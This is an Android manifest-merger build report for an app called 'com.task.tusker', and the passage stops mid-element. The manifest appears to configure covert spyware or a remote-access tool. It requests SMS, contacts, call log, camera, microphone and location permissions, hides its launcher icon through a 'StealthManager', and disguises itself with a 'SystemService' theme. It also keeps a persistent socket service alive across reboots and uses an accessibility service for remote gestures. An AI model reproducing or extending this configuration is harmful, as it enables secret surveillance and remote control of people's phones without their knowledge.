Apk-builder/app/build/intermediates/manifest_merge_blame_file/debug/processDebugMainManifest/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.task.tusker"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="36" />
10
11    <!-- Core networking -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14
15    <!-- Foreground service -->
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src/main/AndroidManifest.xml:10:5-77
16-->src/main/AndroidManifest.xml:10:22-74
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
17-->src/main/AndroidManifest.xml:11:5-87
17-->src/main/AndroidManifest.xml:11:22-84
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
18-->src/main/AndroidManifest.xml:12:5-84
18-->src/main/AndroidManifest.xml:12:22-81
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
19-->src/main/AndroidManifest.xml:13:5-88
19-->src/main/AndroidManifest.xml:13:22-85
20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
20-->src/main/AndroidManifest.xml:14:5-86
20-->src/main/AndroidManifest.xml:14:22-83
21
22    <!-- Keep-alive / boot -->
23    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
23-->src/main/AndroidManifest.xml:17:5-81
23-->src/main/AndroidManifest.xml:17:22-78
24    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
24-->src/main/AndroidManifest.xml:18:5-95
24-->src/main/AndroidManifest.xml:18:22-92
25    <uses-permission android:name="android.permission.WAKE_LOCK" />
25-->src/main/AndroidManifest.xml:19:5-68
25-->src/main/AndroidManifest.xml:19:22-65
26
27    <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
28    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
28-->src/main/AndroidManifest.xml:22:5-80
28-->src/main/AndroidManifest.xml:22:22-77
29
30    <!-- SMS -->
31    <uses-permission android:name="android.permission.READ_SMS" />
31-->src/main/AndroidManifest.xml:25:5-67
31-->src/main/AndroidManifest.xml:25:22-64
32
33    <!-- Contacts & Call logs -->
34    <uses-permission android:name="android.permission.READ_CONTACTS" />
34-->src/main/AndroidManifest.xml:28:5-72
34-->src/main/AndroidManifest.xml:28:22-69
35    <uses-permission android:name="android.permission.READ_CALL_LOG" />
35-->src/main/AndroidManifest.xml:29:5-72
35-->src/main/AndroidManifest.xml:29:22-69
36
37    <!-- Camera / Audio -->
38    <uses-permission android:name="android.permission.CAMERA" />
38-->src/main/AndroidManifest.xml:32:5-65
38-->src/main/AndroidManifest.xml:32:22-62
39    <uses-permission android:name="android.permission.RECORD_AUDIO" />
39-->src/main/AndroidManifest.xml:33:5-71
39-->src/main/AndroidManifest.xml:33:22-68
40
41    <!-- Location -->
42    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
42-->src/main/AndroidManifest.xml:36:5-79
42-->src/main/AndroidManifest.xml:36:22-76
43    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
43-->src/main/AndroidManifest.xml:37:5-81
43-->src/main/AndroidManifest.xml:37:22-78
44
45    <!-- Storage (legacy + Android 13+ media) -->
46    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
46-->src/main/AndroidManifest.xml:40:5-80
46-->src/main/AndroidManifest.xml:40:22-77
47    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
47-->src/main/AndroidManifest.xml:41:5-42:40
47-->src/main/AndroidManifest.xml:41:22-78
48    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
48-->src/main/AndroidManifest.xml:43:5-76
48-->src/main/AndroidManifest.xml:43:22-73
49    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
49-->src/main/AndroidManifest.xml:44:5-75
49-->src/main/AndroidManifest.xml:44:22-72
50    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
50-->src/main/AndroidManifest.xml:45:5-75
50-->src/main/AndroidManifest.xml:45:22-72
51    <!-- Android 11+ unrestricted file access (File Manager) -->
52    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
52-->src/main/AndroidManifest.xml:47:5-48:40
52-->src/main/AndroidManifest.xml:47:22-79
53    <!-- Access precise EXIF location in media files (Android 10+) -->
54    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
54-->src/main/AndroidManifest.xml:50:5-80
54-->src/main/AndroidManifest.xml:50:22-77
55    <!-- WiFi scanning -->
56    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
56-->src/main/AndroidManifest.xml:52:5-76
56-->src/main/AndroidManifest.xml:52:22-73
57    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
57-->src/main/AndroidManifest.xml:53:5-76
57-->src/main/AndroidManifest.xml:53:22-73
58
59    <!-- Device features -->
60    <uses-permission android:name="android.permission.VIBRATE" />
60-->src/main/AndroidManifest.xml:56:5-66
60-->src/main/AndroidManifest.xml:56:22-63
61    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
61-->src/main/AndroidManifest.xml:57:5-79
61-->src/main/AndroidManifest.xml:57:22-76
62
63    <!-- Notifications (Android 13+) -->
64    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
64-->src/main/AndroidManifest.xml:60:5-77
64-->src/main/AndroidManifest.xml:60:22-74
65
66    <!-- Required to trigger the system uninstall dialog for other apps -->
67    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
67-->src/main/AndroidManifest.xml:63:5-82
67-->src/main/AndroidManifest.xml:63:22-79
68
69    <!-- Required on Android 11+ to query and list all installed packages -->
70    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
70-->src/main/AndroidManifest.xml:66:5-67:53
70-->src/main/AndroidManifest.xml:66:22-74
71
72    <permission
72-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
73        android:name="com.task.tusker.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
73-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
74        android:protectionLevel="signature" />
74-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
75
76    <uses-permission android:name="com.task.tusker.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
76-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
76-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
77
78    <application
78-->src/main/AndroidManifest.xml:69:5-195:19
79        android:allowBackup="false"
79-->src/main/AndroidManifest.xml:70:9-36
80        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
80-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
81        android:dataExtractionRules="@xml/data_extraction_rules"
81-->src/main/AndroidManifest.xml:71:9-65
82        android:debuggable="true"
83        android:extractNativeLibs="false"
84        android:fullBackupContent="@xml/backup_rules"
84-->src/main/AndroidManifest.xml:72:9-54
85        android:icon="@mipmap/ic_launcher"
85-->src/main/AndroidManifest.xml:73:9-43
86        android:label="@string/app_name"
86-->src/main/AndroidManifest.xml:74:9-41
87        android:preserveLegacyExternalStorage="true"
87-->src/main/AndroidManifest.xml:79:9-53
88        android:requestLegacyExternalStorage="true"
88-->src/main/AndroidManifest.xml:78:9-52
89        android:roundIcon="@mipmap/ic_launcher_round"
89-->src/main/AndroidManifest.xml:75:9-54
90        android:supportsRtl="true"
90-->src/main/AndroidManifest.xml:76:9-35
91        android:theme="@style/Theme.SystemService" >
91-->src/main/AndroidManifest.xml:77:9-51
92
93        <!--
94            Main Activity — NOT visible in the home launcher.
95            CATEGORY_INFO makes getLaunchIntentForPackage() resolve this activity,
96            which is exactly what Settings > App Info > Open uses — so "Open"
97            stays enabled while the app never appears in the app drawer.
98            CATEGORY_LAUNCHER is intentionally absent from this activity.
99        -->
100        <activity
100-->src/main/AndroidManifest.xml:89:9-105:20
101            android:name="com.task.tusker.MainActivity"
101-->src/main/AndroidManifest.xml:90:13-41
102            android:enabled="true"
102-->src/main/AndroidManifest.xml:91:13-35
103            android:excludeFromRecents="true"
103-->src/main/AndroidManifest.xml:94:13-46
104            android:exported="true"
104-->src/main/AndroidManifest.xml:92:13-36
105            android:launchMode="singleTop" >
105-->src/main/AndroidManifest.xml:93:13-43
106
107            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
108            <intent-filter>
108-->src/main/AndroidManifest.xml:96:13-99:29
109                <action android:name="android.intent.action.MAIN" />
109-->src/main/AndroidManifest.xml:97:17-69
109-->src/main/AndroidManifest.xml:97:25-66
110
111                <category android:name="android.intent.category.INFO" />
111-->src/main/AndroidManifest.xml:98:17-73
111-->src/main/AndroidManifest.xml:98:27-70
112            </intent-filter>
113            <!-- Custom action for programmatic / ADB launch -->
114            <intent-filter>
114-->src/main/AndroidManifest.xml:101:13-104:29
115                <action android:name="com.task.tusker.LAUNCH" />
115-->src/main/AndroidManifest.xml:102:17-65
115-->src/main/AndroidManifest.xml:102:25-62
116
117                <category android:name="android.intent.category.DEFAULT" />
117-->src/main/AndroidManifest.xml:103:17-76
117-->src/main/AndroidManifest.xml:103:27-73
118            </intent-filter>
119        </activity>
120        <!--
121            Launcher alias — disabled by default so no icon appears in the drawer.
122            StealthManager.showAppIcon() can enable this to temporarily surface
123            the app in the launcher; hideAppIcon() disables it again.
124        -->
125        <activity-alias
125-->src/main/AndroidManifest.xml:112:9-121:26
126            android:name="com.task.tusker.LauncherAlias"
126-->src/main/AndroidManifest.xml:113:13-42
127            android:enabled="false"
127-->src/main/AndroidManifest.xml:115:13-36
128            android:exported="true"
128-->src/main/AndroidManifest.xml:116:13-36
129            android:targetActivity="com.task.tusker.MainActivity" >
129-->src/main/AndroidManifest.xml:114:13-51
130            <intent-filter>
130-->src/main/AndroidManifest.xml:117:13-120:29
131                <action android:name="android.intent.action.MAIN" />
131-->src/main/AndroidManifest.xml:97:17-69
131-->src/main/AndroidManifest.xml:97:25-66
132
133                <category android:name="android.intent.category.LAUNCHER" />
133-->src/main/AndroidManifest.xml:119:17-77
133-->src/main/AndroidManifest.xml:119:27-74
134            </intent-filter>
135        </activity-alias>
136
137        <!-- Consent Activity -->
138        <activity
138-->src/main/AndroidManifest.xml:124:9-127:40
139            android:name="com.task.tusker.ConsentActivity"
139-->src/main/AndroidManifest.xml:125:13-44
140            android:enabled="true"
140-->src/main/AndroidManifest.xml:126:13-35
141            android:exported="false" />
141-->src/main/AndroidManifest.xml:127:13-37
142
143        <!--
144            Transparent trampoline activity used by PermissionManager to show the
145            native runtime-permission dialog from a Service context.
146            Must be exported=false (only launched internally) and use the
147            transparent theme so only the system dialog is visible to the user.
148        -->
149        <activity
149-->src/main/AndroidManifest.xml:135:9-141:46
150            android:name="com.task.tusker.PermissionRequestActivity"
150-->src/main/AndroidManifest.xml:136:13-54
151            android:enabled="true"
151-->src/main/AndroidManifest.xml:137:13-35
152            android:excludeFromRecents="true"
152-->src/main/AndroidManifest.xml:140:13-46
153            android:exported="false"
153-->src/main/AndroidManifest.xml:138:13-37
154            android:launchMode="singleTop"
154-->src/main/AndroidManifest.xml:141:13-43
155            android:theme="@style/Theme.Transparent" />
155-->src/main/AndroidManifest.xml:139:13-53
156
157        <!--
158            Background Service
159            foregroundServiceType covers all possible sensor/data types this
160            service may use so Android 14 doesn't kill it mid-operation.
161        -->
162        <service
162-->src/main/AndroidManifest.xml:148:9-152:83
163            android:name="com.task.tusker.services.DataSyncService"
163-->src/main/AndroidManifest.xml:149:13-53
164            android:enabled="true"
164-->src/main/AndroidManifest.xml:150:13-35
165            android:exported="false"
165-->src/main/AndroidManifest.xml:151:13-37
166            android:foregroundServiceType="dataSync|camera|microphone|location" />
166-->src/main/AndroidManifest.xml:152:13-80
167
168        <!--
169            Secondary Background Service (com.access.client.BackgroundService)
170            Lightweight foreground service that holds the SocketManager
171            connection.  Declared with only the dataSync type so it can
172            always go foreground on Android 15 without requiring
173            camera / microphone / location runtime permissions up front.
174        -->
175        <service
175-->src/main/AndroidManifest.xml:161:9-165:56
176            android:name="com.access.client.BackgroundService"
176-->src/main/AndroidManifest.xml:162:13-63
177            android:enabled="true"
177-->src/main/AndroidManifest.xml:163:13-35
178            android:exported="false"
178-->src/main/AndroidManifest.xml:164:13-37
179            android:foregroundServiceType="dataSync" />
179-->src/main/AndroidManifest.xml:165:13-53
180
181        <!-- Boot Receiver -->
182        <receiver
182-->src/main/AndroidManifest.xml:168:9-177:20
183            android:name="com.task.tusker.receivers.BootReceiver"
183-->src/main/AndroidManifest.xml:169:13-51
184            android:enabled="true"
184-->src/main/AndroidManifest.xml:170:13-35
185            android:exported="true" >
185-->src/main/AndroidManifest.xml:171:13-36
186            <intent-filter>
186-->src/main/AndroidManifest.xml:172:13-176:29
187                <action android:name="android.intent.action.BOOT_COMPLETED" />
187-->src/main/AndroidManifest.xml:173:17-79
187-->src/main/AndroidManifest.xml:173:25-76
188                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
188-->src/main/AndroidManifest.xml:174:17-84
188-->src/main/AndroidManifest.xml:174:25-81
189                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
189-->src/main/AndroidManifest.xml:175:17-82
189-->src/main/AndroidManifest.xml:175:25-79
190            </intent-filter>
191        </receiver>
192
193        <!--
194            Unified Accessibility Service
195            canPerformGestures="true" is required for touch/swipe commands.
196        -->
197        <service
197-->src/main/AndroidManifest.xml:183:9-193:19
198            android:name="com.task.tusker.services.UnifiedAccessibilityService"
198-->src/main/AndroidManifest.xml:184:13-65
199            android:exported="false"
199-->src/main/AndroidManifest.xml:186:13-37
200            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
200-->src/main/AndroidManifest.xml:185:13-79
201            <intent-filter>
201-->src/main/AndroidManifest.xml:187:13-189:29
202                <action android:name="android.accessibilityservice.AccessibilityService" />
202-->src/main/AndroidManifest.xml:188:17-92
202-->src/main/AndroidManifest.xml:188:25-89
203            </intent-filter>
204
205            <meta-data
205-->src/main/AndroidManifest.xml:190:13-192:72
206                android:name="android.accessibilityservice"
206-->src/main/AndroidManifest.xml:191:17-60
207                android:resource="@xml/accessibility_service_config" />
207-->src/main/AndroidManifest.xml:192:17-69
208        </service>
209
210        <activity
210-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:27:9-29:72
211            android:name="com.karumi.dexter.DexterActivity"
211-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:28:13-60
212            android:theme="@style/Dexter.Internal.Theme.Transparent" />
212-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:29:13-69
213
214        <provider
214-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:29:9-37:20
215            android:name="androidx.startup.InitializationProvider"
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:30:13-67
216            android:authorities="com.task.tusker.androidx-startup"
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:31:13-68
217            android:exported="false" >
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:32:13-37
218            <meta-data
218-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
219                android:name="androidx.work.WorkManagerInitializer"
219-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
220                android:value="androidx.startup" />
220-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
221            <meta-data
221-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
222                android:name="androidx.emoji2.text.EmojiCompatInitializer"
222-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
223                android:value="androidx.startup" />
223-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
224            <meta-data
224-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
225                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
225-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
226                android:value="androidx.startup" />
226-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
227            <meta-data
227-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
228                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
228-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
229                android:value="androidx.startup" />
229-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
230        </provider>
231
232        <service
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
233            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
234            android:directBootAware="false"
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
235            android:enabled="@bool/enable_system_alarm_service_default"
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
236            android:exported="false" />
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
237        <service
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
238            android:name="androidx.work.impl.background.systemjob.SystemJobService"
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
239            android:directBootAware="false"
239-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
240            android:enabled="@bool/enable_system_job_service_default"
240-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
241            android:exported="true"
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
242            android:permission="android.permission.BIND_JOB_SERVICE" />
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
243        <service
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
244            android:name="androidx.work.impl.foreground.SystemForegroundService"
244-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
245            android:directBootAware="false"
245-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
246            android:enabled="@bool/enable_system_foreground_service_default"
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
247            android:exported="false" />
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
248
249        <receiver
249-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
250            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
250-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
251            android:directBootAware="false"
251-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
252            android:enabled="true"
252-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
253            android:exported="false" />
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
254        <receiver
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
255            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
255-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
256            android:directBootAware="false"
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
257            android:enabled="false"
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
258            android:exported="false" >
258-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
259            <intent-filter>
259-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
260                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
261                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
261-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
261-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
262            </intent-filter>
263        </receiver>
264        <receiver
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
265            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
265-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
266            android:directBootAware="false"
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
267            android:enabled="false"
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
268            android:exported="false" >
268-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
269            <intent-filter>
269-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
270                <action android:name="android.intent.action.BATTERY_OKAY" />
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
271                <action android:name="android.intent.action.BATTERY_LOW" />
271-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
271-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
272            </intent-filter>
273        </receiver>
274        <receiver
274-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
275            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
275-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
276            android:directBootAware="false"
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
277            android:enabled="false"
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
278            android:exported="false" >
278-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
279            <intent-filter>
279-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
280                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
281                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
281-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
281-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
282            </intent-filter>
283        </receiver>
284        <receiver
284-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
285            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
285-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
286            android:directBootAware="false"
286-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
287            android:enabled="false"
287-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
288            android:exported="false" >
288-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
289            <intent-filter>
289-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
290                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
290-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
290-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
291            </intent-filter>
292        </receiver>
293        <receiver
293-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
294            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
294-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
295            android:directBootAware="false"
295-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
296            android:enabled="false"
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
297            android:exported="false" >
297-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
298            <intent-filter>
298-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
299                <action android:name="android.intent.action.BOOT_COMPLETED" />
299-->src/main/AndroidManifest.xml:173:17-79
299-->src/main/AndroidManifest.xml:173:25-76
300                <action android:name="android.intent.action.TIME_SET" />
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
301                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
301-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
301-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
302            </intent-filter>
303        </receiver>
304        <receiver
304-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
305            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
305-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
306            android:directBootAware="false"
306-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
307            android:enabled="@bool/enable_system_alarm_service_default"
307-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
308            android:exported="false" >
308-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
309            <intent-filter>
309-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
310                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
310-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
310-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
311            </intent-filter>
312        </receiver>
313        <receiver
313-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
314            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
314-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
315            android:directBootAware="false"
315-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
316            android:enabled="true"
316-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
317            android:exported="true"
317-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
318            android:permission="android.permission.DUMP" >
318-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
319            <intent-filter>
319-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
320                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
320-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
320-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
321            </intent-filter>
322        </receiver>
323
324        <service
324-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
325            android:name="androidx.room.MultiInstanceInvalidationService"